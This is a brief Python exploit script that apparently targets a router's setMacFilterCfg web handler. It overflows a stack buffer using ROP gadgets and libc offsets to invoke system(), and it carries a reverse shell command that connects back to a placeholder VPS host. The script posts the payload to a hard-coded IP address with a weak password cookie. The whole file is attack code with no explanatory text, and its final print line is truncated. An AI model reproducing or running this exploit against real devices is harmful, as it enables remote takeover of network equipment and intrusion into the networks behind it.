import requests
from pwn import *


url = "http://8.210.119.59:9990/goform/setMacFilterCfg"
cookie = {"Cookie":"password=12345"}
cmd='bash -c "bash -i >& /dev/tcp/vps_ip/1234 0>&1"\x00'
libc_base = 0xf65d8f70-0x0003df70
system_offset = 0x5a270
gadget1_offset = 0x18298
gadget2_offset = 0x40cb8
system_addr = libc_base + system_offset
gadget1 = libc_base + gadget1_offset
gadget2 = libc_base + gadget2_offset


payload = "A"*176 + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd


data = {"macFilterType": "white", "deviceList": "\r"+ payload}
s=requests.post(url, cookies=cookie, data=data)
print s.t
